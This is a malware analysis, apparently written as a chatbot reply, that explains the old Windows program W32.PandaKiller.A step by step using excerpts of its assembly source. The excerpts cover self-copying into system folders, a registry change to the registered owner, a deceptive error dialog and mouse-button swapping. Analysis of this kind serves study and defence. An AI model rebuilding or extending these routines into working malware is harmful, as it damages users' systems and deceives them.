
Here’s a structured analysis of the **W32.PandaKiller.A** malware, with explanations illustrated by snippets of the original assembly code.

----------

## **1. Directory Creation**

The malware creates two directories:

-   `C:\PandaKiller`
-   `%windir%\Panda`

This is done using the `CreateDirectoryA` function:

```assembly
push 00000000h
push offset rep1
call CreateDirectoryA           ; Creates C:\PandaKiller

push 260
push offset targ1
call GetWindowsDirectoryA
push offset rep2
push offset targ1
call lstrcat
push offset targ1
call CreateDirectoryA           ; Creates %windir%\Panda
```

----------

## **2. Self-Copying Mechanism**

The malware copies itself to multiple locations:

-   `%windir%\PandaKiller.exe`
-   `%system%\Monopoly.exe`
-   `%windir%\Panda\Stages.exe`

This is achieved using `CopyFileA`:

```assembly
push 00000000h
call GetModuleHandleA
push 260
push offset moi
push eax
call GetModuleFileNameA         ; Get the current executable's path

push 260
push offset targ1
call GetWindowsDirectoryA
push offset copie1
push offset targ1
call lstrcat
push 00000000h
push offset targ1
push offset moi
call CopyFileA                  ; Copy to %windir%\PandaKiller.exe
```

----------

## **3. Creating a Text File with a Message**

The malware creates a file `C:\PandaKiller\EMail.txt` and writes a message inside:

```assembly
push 00000000h
push 00000080h
push 00000002h
push 00000000h
push 00000001h
push 40000000h
push offset fichier
call CreateFileA                ; Create the file C:\PandaKiller\EMail.txt

mov  [fh],eax
push 00h
push offset octets
push taille
push offset TXT
push [fh]
call WriteFile                  ; Write content to the file

push [fh]
call CloseHandle                ; Close the file
```

The content written to the file:

```assembly
	TXT     db "[PandaKiller]",0dh,0ah
        db "Contact: Panda34@caramail.com",0dh,0ah
        db "W32.PandaKiller.A by PandaKiller (c)2000",00h
```

----------

## **4. Registry Modification**

The malware modifies the Windows registry to change the **Registered Owner** to `"PandaKiller"`.

```assembly
push offset p
push 0
push 1F0000h + 1 + 2h
push 0
push 0
push 0
push offset CLE
push 80000002h                  ; HKEY_LOCAL_MACHINE
call RegCreateKeyExA

push 05h
push offset DONNEE              ; "PandaKiller"
push 01h
push 0
push offset NOM                 ; RegisteredOwner
push p
call RegSetValueExA             ; Set registry value

push 0
call RegCloseKey                ; Close registry
```
----------

## **5. Displaying a Fake Error Message**

The malware displays a fake error message to deceive the user.

```assembly
push 35h
push offset TITRE
push offset TEXTE
push 00h
call MessageBoxA
```

```assembly
TITRE   db "By PandaKiller on 12/10/00",00h
TEXTE   db "****************************",10,13
        db "This file is not valid!",10,13
        db "****************************",00h` 
```
----------

## **6. Swapping Mouse Buttons**

If the user clicks "Retry," the malware swaps the mouse buttons using `SwapMouseButton`, reversing left and right clicks.

```assembly
SOURIS: push 01h
        call SwapMouseButton
```

----------

## **7. Execution Termination**

Finally, the malware ends execution using `ExitProcess`.

```assembly
		FIN:
        push 0
        call ExitProcess` 
```
----------

This structured analysis illustrates how **W32.PandaKiller.A** operates, showing its **directory creation, self-copying, registry modification, deceptive messages, and user interaction interference**. Let me know if you need further clarifications! 🚀
